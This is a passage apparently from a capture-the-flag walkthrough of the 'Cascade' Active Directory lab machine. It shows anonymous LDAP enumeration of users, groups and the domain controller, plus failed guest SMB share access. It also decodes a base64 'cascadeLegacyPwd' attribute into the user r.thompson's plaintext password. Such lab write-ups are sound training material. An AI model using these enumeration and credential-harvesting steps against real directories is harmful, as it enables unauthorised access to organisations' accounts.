dNSHostName: CASC-DC1.cascade.local
rIDSetReferences: CN=RID Set,CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=l
 ocal
servicePrincipalName: TERMSRV/CASC-DC1
servicePrincipalName: TERMSRV/CASC-DC1.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/ForestDnsZones.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/DomainDnsZones.cascade.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/CASC-DC1.casca
 de.local
servicePrincipalName: DNS/CASC-DC1.cascade.local
servicePrincipalName: GC/CASC-DC1.cascade.local/cascade.local
servicePrincipalName: RestrictedKrbHost/CASC-DC1.cascade.local
servicePrincipalName: RestrictedKrbHost/CASC-DC1
servicePrincipalName: HOST/CASC-DC1/CASCADE
servicePrincipalName: HOST/CASC-DC1.cascade.local/CASCADE
servicePrincipalName: HOST/CASC-DC1
servicePrincipalName: HOST/CASC-DC1.cascade.local
servicePrincipalName: HOST/CASC-DC1.cascade.local/cascade.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/8bfc9a6c-6edc-45bd-
 9e27-251f9de2d5f7/cascade.local
servicePrincipalName: ldap/CASC-DC1/CASCADE
servicePrincipalName: ldap/8bfc9a6c-6edc-45bd-9e27-251f9de2d5f7._msdcs.cascade
 .local
servicePrincipalName: ldap/CASC-DC1.cascade.local/CASCADE
servicePrincipalName: ldap/CASC-DC1
servicePrincipalName: ldap/CASC-DC1.cascade.local
servicePrincipalName: ldap/CASC-DC1.cascade.local/cascade.local
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=cascade,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200109175934.0Z
dSCorePropagationData: 20200109154857.0Z
dSCorePropagationData: 16010714223649.0Z
lastLogonTimestamp: 132817249952809263
msDS-SupportedEncryptionTypes: 31
msDFSR-ComputerReferenceBL: CN=CASC-DC1,CN=Topology,CN=Domain System Volume,CN
 =DFSR-GlobalSettings,CN=System,DC=cascade,DC=local

dn: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: ArkSvc
distinguishedName: CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109161820.0Z
whenChanged: 20200323113833.0Z
displayName: ArkSvc
uSNCreated: 12799
memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295021
name: ArkSvc
objectGUID:: ELXj5FhFXUmr2tAqpnaTNA==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324189751653
lastLogoff: 0
lastLogon: 132248055409887841
pwdLastSet: 132230603002172876
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFUgQAAA==
accountExpires: 9223372036854775807
logonCount: 13
sAMAccountName: arksvc
sAMAccountType: 805306368
userPrincipalName: arksvc@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163635.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 132294371134322815

dn: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Steve Smith
sn: Smith
givenName: Steve
distinguishedName: CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109180813.0Z
whenChanged: 20200323113113.0Z
displayName: Steve Smith
uSNCreated: 16404
memberOf: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295015
name: Steve Smith
objectGUID:: 39nrOPfEAE2an/UDQy/6fQ==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324192559658
lastLogoff: 0
lastLogon: 132247275990842339
scriptPath: MapAuditDrive.vbs
pwdLastSet: 132247150854857364
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFUwQAAA==
accountExpires: 9223372036854775807
logonCount: 16
sAMAccountName: s.smith
sAMAccountType: 805306368
userPrincipalName: s.smith@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200109180813.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 132294366735115088

dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324195211663
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

dn: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Util
distinguishedName: CN=Util,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109194521.0Z
whenChanged: 20200128180947.0Z
displayName: Util
uSNCreated: 24650
uSNChanged: 245850
name: Util
objectGUID:: GdAgZzaP8E6S7CzuIP8sag==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324198019668
lastLogoff: 0
lastLogon: 132247085871071226
pwdLastSet: 132233548311955855
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVwQAAA==
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: util
sAMAccountType: 805306368
userPrincipalName: util@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163635.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 16010101000417.0Z
lastLogonTimestamp: 132247085871071226

dn: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: James Wakefield
sn: Wakefield
givenName: James
distinguishedName: CN=James Wakefield,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109203444.0Z
whenChanged: 20200115215201.0Z
displayName: James Wakefield
uSNCreated: 28741
uSNChanged: 118849
name: James Wakefield
objectGUID:: 6SX/H/Sf5UOkC8IjbIii7A==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324200827673
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132230756844150124
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFXAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: j.wakefield
sAMAccountType: 805306368
userPrincipalName: j.wakefield@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200109203444.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Stephanie Hickson
sn: Hickson
givenName: Stephanie
distinguishedName: CN=Stephanie Hickson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113012427.0Z
whenChanged: 20200115215221.0Z
displayName: Stephanie Hickson
uSNCreated: 65594
memberOf: CN=HR,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 118853
name: Stephanie Hickson
objectGUID:: rCGbAiT7r0CiOzKwLPa8NQ==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324203635678
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132233522678003963
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFYQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: s.hickson
sAMAccountType: 805306368
userPrincipalName: s.hickson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113012427.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: John Goodhand
sn: Goodhand
givenName: John
distinguishedName: CN=John Goodhand,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113014026.0Z
whenChanged: 20200115215154.0Z
displayName: John Goodhand
uSNCreated: 65614
uSNChanged: 118848
name: John Goodhand
objectGUID:: 7TACWgpE/kqlMHRot3JgpQ==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324206287682
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132233532260320793
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFYgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: j.goodhand
sAMAccountType: 805306368
userPrincipalName: j.goodhand@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113014026.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Adrian Turnbull
sn: Turnbull
givenName: Adrian
distinguishedName: CN=Adrian Turnbull,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113014313.0Z
whenChanged: 20200113034534.0Z
displayName: Adrian Turnbull
uSNCreated: 65635
uSNChanged: 94281
name: Adrian Turnbull
objectGUID:: PkhsX7HK0UKVFdwqFTWrnQ==
userAccountControl: 66080
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324209251687
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132233533933579732
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: a.turnbull
sAMAccountType: 805306368
userPrincipalName: a.turnbull@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113015223.0Z
dSCorePropagationData: 16030216172521.0Z
msDS-SupportedEncryptionTypes: 0

dn: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Edward Crowe
sn: Crowe
givenName: Edward
distinguishedName: CN=Edward Crowe,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113034502.0Z
whenChanged: 20200128180707.0Z
displayName: Edward Crowe
uSNCreated: 94274
uSNChanged: 245840
name: Edward Crowe
objectGUID:: spB7cioaike11C+BNt/oVg==
userAccountControl: 66050
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324211903692
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132233607021669462
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFZwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: e.crowe
sAMAccountType: 805306368
userPrincipalName: e.crowe@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113034502.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ben Hanson
sn: Hanson
givenName: Ben
distinguishedName: CN=Ben Hanson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113163539.0Z
whenChanged: 20200128180729.0Z
displayName: Ben Hanson
uSNCreated: 114734
uSNChanged: 245841
name: Ben Hanson
objectGUID:: aiS9+OrNYE6UJnr8wuBpHg==
userAccountControl: 66050
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324214711697
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132234069391538655
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFaAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: b.hanson
sAMAccountType: 805306368
userPrincipalName: b.hanson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113163539.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: David Burman
sn: Burman
givenName: David
distinguishedName: CN=David Burman,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113163612.0Z
whenChanged: 20200115215216.0Z
displayName: David Burman
uSNCreated: 114742
uSNChanged: 118852
name: David Burman
objectGUID:: UqmXwgkl/0iy14P121+N7A==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324217363702
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132234069729591249
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFaQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: d.burman
sAMAccountType: 805306368
userPrincipalName: d.burman@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163628.0Z
dSCorePropagationData: 20200113163613.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: BackupSvc
givenName: BackupSvc
distinguishedName: CN=BackupSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113163703.0Z
whenChanged: 20200113163732.0Z
displayName: BackupSvc
uSNCreated: 114757
uSNChanged: 114765
name: BackupSvc
objectGUID:: /AeVxvZYJ0S4xu2RXKx+KA==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324220327707
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132234070231912131
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFagQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: BackupSvc
sAMAccountType: 805306368
userPrincipalName: BackupSvc@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113163703.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Joseph Allen
sn: Allen
givenName: Joseph
distinguishedName: CN=Joseph Allen,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200113172359.0Z
whenChanged: 20200115215149.0Z
displayName: Joseph Allen
uSNCreated: 114807
uSNChanged: 118847
name: Joseph Allen
objectGUID:: HEPoVWJubkGd3J25ACGaRA==
userAccountControl: 66048
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324223447712
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132234098399165604
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFbgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: j.allen
sAMAccountType: 805306368
userPrincipalName: j.allen@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200113172359.0Z
dSCorePropagationData: 16010101000417.0Z

dn: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ian Croft
sn: Croft
givenName: Ian
distinguishedName: CN=Ian Croft,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200115214621.0Z
whenChanged: 20200128180700.0Z
displayName: Ian Croft
uSNCreated: 118835
uSNChanged: 245839
name: Ian Croft
objectGUID:: nRdObhMYfkOzzZt2y5gHxw==
userAccountControl: 66050
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324226099717
lastLogoff: 0
lastLogon: 0
scriptPath: MapDataDrive.vbs
pwdLastSet: 132235983818652005
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFbwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: i.croft
sAMAccountType: 805306368
userPrincipalName: i.croft@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200115214621.0Z
dSCorePropagationData: 16010101000417.0Z
```

It appears that many users have the `scriptPath` attribute defined as `MapDataDrive.vbs`. For these users, this script is executed whenever they log in.

Filter away all of the common user attributes from the above output.

```bash
$ cat ldap-users.txt | grep -v -f users.txt

name: CASC-DC1
localPolicyFlags: 0
 CN=Configuration,DC=cascade,DC=local
rIDSetReferences: CN=RID Set,CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=l
 ocal
 de.local
 9e27-251f9de2d5f7/cascade.local
 .local

name: ArkSvc

name: Steve Smith

name: Ryan Thompson
cascadeLegacyPwd: clk0bjVldmE=

name: Util

name: James Wakefield

name: Stephanie Hickson

name: John Goodhand

name: Adrian Turnbull

name: Edward Crowe

name: Ben Hanson

name: David Burman

name: BackupSvc

name: Joseph Allen

name: Ian Croft
```

The user account `r.thompson` has a non-standard attribute `cascadeLegacyPwd` with the value `clk0bjVldmE=`. This appears to be a legacy password. Base64  decoding it yields the password `rY4n5eva`.

### Domain Computers

```bash
$ ldapsearch -LLL -x -h 10.129.203.112 -b 'dc=cascade,dc=local' '(&(objectclass=computer)(name=*))' name sAMAccountName
dn: CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=local
name: CASC-DC1
sAMAccountName: CASC-DC1$
```

The domain controller is the only computer account in the domain.

### Domain Groups

```bash
$ ldapsearch -LLL -x -h 10.129.203.112 -b 'dc=cascade,dc=local' '(&(objectclass=group)(name=*))' name sAMAccountName
dn: CN=Users,CN=Builtin,DC=cascade,DC=local
name: Users
sAMAccountName: Users

dn: CN=Guests,CN=Builtin,DC=cascade,DC=local
name: Guests
sAMAccountName: Guests

dn: CN=Remote Desktop Users,CN=Builtin,DC=cascade,DC=local
name: Remote Desktop Users
sAMAccountName: Remote Desktop Users

dn: CN=Network Configuration Operators,CN=Builtin,DC=cascade,DC=local
name: Network Configuration Operators
sAMAccountName: Network Configuration Operators

dn: CN=Performance Monitor Users,CN=Builtin,DC=cascade,DC=local
name: Performance Monitor Users
sAMAccountName: Performance Monitor Users

dn: CN=Performance Log Users,CN=Builtin,DC=cascade,DC=local
name: Performance Log Users
sAMAccountName: Performance Log Users

dn: CN=Distributed COM Users,CN=Builtin,DC=cascade,DC=local
name: Distributed COM Users
sAMAccountName: Distributed COM Users

dn: CN=IIS_IUSRS,CN=Builtin,DC=cascade,DC=local
name: IIS_IUSRS
sAMAccountName: IIS_IUSRS

dn: CN=Cryptographic Operators,CN=Builtin,DC=cascade,DC=local
name: Cryptographic Operators
sAMAccountName: Cryptographic Operators

dn: CN=Event Log Readers,CN=Builtin,DC=cascade,DC=local
name: Event Log Readers
sAMAccountName: Event Log Readers

dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=cascade,DC=local
name: Certificate Service DCOM Access
sAMAccountName: Certificate Service DCOM Access

dn: CN=Domain Computers,CN=Users,DC=cascade,DC=local
name: Domain Computers
sAMAccountName: Domain Computers

dn: CN=Cert Publishers,CN=Users,DC=cascade,DC=local
name: Cert Publishers
sAMAccountName: Cert Publishers

dn: CN=Domain Users,CN=Users,DC=cascade,DC=local
name: Domain Users
sAMAccountName: Domain Users

dn: CN=Domain Guests,CN=Users,DC=cascade,DC=local
name: Domain Guests
sAMAccountName: Domain Guests

dn: CN=Group Policy Creator Owners,CN=Users,DC=cascade,DC=local
name: Group Policy Creator Owners
sAMAccountName: Group Policy Creator Owners

dn: CN=RAS and IAS Servers,CN=Users,DC=cascade,DC=local
name: RAS and IAS Servers
sAMAccountName: RAS and IAS Servers

dn: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=cascade,DC=local
name: Pre-Windows 2000 Compatible Access
sAMAccountName: Pre-Windows 2000 Compatible Access

dn: CN=Incoming Forest Trust Builders,CN=Builtin,DC=cascade,DC=local
name: Incoming Forest Trust Builders
sAMAccountName: Incoming Forest Trust Builders

dn: CN=Windows Authorization Access Group,CN=Builtin,DC=cascade,DC=local
name: Windows Authorization Access Group
sAMAccountName: Windows Authorization Access Group

dn: CN=Terminal Server License Servers,CN=Builtin,DC=cascade,DC=local
name: Terminal Server License Servers
sAMAccountName: Terminal Server License Servers

dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=cascade,DC=local
name: Allowed RODC Password Replication Group
sAMAccountName: Allowed RODC Password Replication Group

dn: CN=Denied RODC Password Replication Group,CN=Users,DC=cascade,DC=local
name: Denied RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group

dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=cascade,DC=local
name: Enterprise Read-only Domain Controllers
sAMAccountName: Enterprise Read-only Domain Controllers

dn: CN=DnsAdmins,CN=Users,DC=cascade,DC=local
name: DnsAdmins
sAMAccountName: DnsAdmins

dn: CN=DnsUpdateProxy,CN=Users,DC=cascade,DC=local
name: DnsUpdateProxy
sAMAccountName: DnsUpdateProxy

dn: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
name: IT
sAMAccountName: IT

dn: CN=Production,OU=Groups,OU=UK,DC=cascade,DC=local
name: Production
sAMAccountName: Production

dn: CN=HR,OU=Groups,OU=UK,DC=cascade,DC=local
name: HR
sAMAccountName: HR

dn: CN=AD Recycle Bin,OU=Groups,OU=UK,DC=cascade,DC=local
name: AD Recycle Bin
sAMAccountName: AD Recycle Bin

dn: CN=Backup,OU=Groups,OU=UK,DC=cascade,DC=local
name: Backup
sAMAccountName: Backup

dn: CN=Temps,OU=Groups,OU=UK,DC=cascade,DC=local
name: Temps
sAMAccountName: Temps

dn: CN=WinRMRemoteWMIUsers__,CN=Users,DC=cascade,DC=local
name: WinRMRemoteWMIUsers__
sAMAccountName: WinRMRemoteWMIUsers__

dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
name: Remote Management Users
sAMAccountName: Remote Management Users

dn: CN=Factory,OU=Groups,OU=UK,DC=cascade,DC=local
name: Factory
sAMAccountName: Factory

dn: CN=Finance,OU=Groups,OU=UK,DC=cascade,DC=local
name: Finance
sAMAccountName: Finance

dn: CN=Audit Share,OU=Groups,OU=UK,DC=cascade,DC=local
name: Audit Share
sAMAccountName: Audit Share

dn: CN=Data Share,OU=Groups,OU=UK,DC=cascade,DC=local
name: Data Share
sAMAccountName: Data Share
```

The domain has several interesting, non-standard groups such as `IT`, `HR`, `AD Recycle Bin`, `Backup`, `Temps`, `Factory`, `Finance`, `Audit Share`, and `Data Share`.

The `Audit Share` and `Data Share` groups' descriptions are `\\Casc-DC1\Audit$` and `\\Casc-DC1\Data`, respectively.

Attempting to connect to these shares fails.

```bash
$ smbclient -U '%' '//10.129.203.112/Audit$'
tree connect failed: NT_STATUS_ACCESS_DENIED
$ smbclient -U '%' //10.129.203.112/Data
tree connect failed: NT_STATUS_ACCESS_DENIED
$ smbclient -U 'guest%' //10.129.203.112/Audit\$
tree connect failed: NT_STATUS_ACCESS_DENIED
$ smbclient -U 'guest%' //10.129.203.112/Data
tree connect failed: NT_STATUS_ACCESS_DENIED
```

### Domain Users

```bash
$ ldapsearch -LLL -x -h 10.129.203.112 -b 'dc=cascade,dc=local' '(&(objectclass=user)(name=*))'
dn: CN=CascGuest,CN=Users,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: CascGuest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=CascGuest,CN=Users,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109153140.0Z
whenChanged: 20200110160637.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=cascade,DC=local
uSNChanged: 45094
name: CascGuest
objectGUID:: LrFX+qgBukGjmV+ZFABrZw==
userAccountControl: 66082
badPwdCount: 19
codePage: 0
countryCode: 0
badPasswordTime: 132817324184291644
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJF9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: CascGuest
sAMAccountType: 805306368
userPrincipalName: CascGuest@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20200117033736.0Z
dSCorePropagationData: 20200117001404.0Z
dSCorePropagationData: 20200109175934.0Z
dSCorePropagationData: 20200109154857.0Z
dSCorePropagationData: 16010714223649.0Z
lastLogonTimestamp: 132230700642958462

dn: CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: CASC-DC1
distinguishedName: CN=CASC-DC1,OU=Domain Controllers,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109153215.0Z
whenChanged: 20211118160315.0Z
uSNCreated: 12293
uSNChanged: 344202
name: CASC-DC1
objectGUID:: YzFU46Jo90CiFCmHfZLVOQ==
userAccountControl: 532480
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132817324186943648
lastLogoff: 0
lastLogon: 132817340412688147
localPolicyFlags: 0
pwdLastSet: 132808603030940853
primaryGroupID: 516
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJF6QMAAA==
accountExpires: 9223372036854775807
logonCount: 5976
sAMAccountName: CASC-DC1$
sAMAccountType: 805306369
operatingSystem: Windows Server 2008 R2 Standard
operatingSystemVersion: 6.1 (7601)
operatingSystemServicePack: Service Pack 1
serverReferenceBL: CN=CASC-DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,
 CN=Configuration,DC=cascade,DC=local
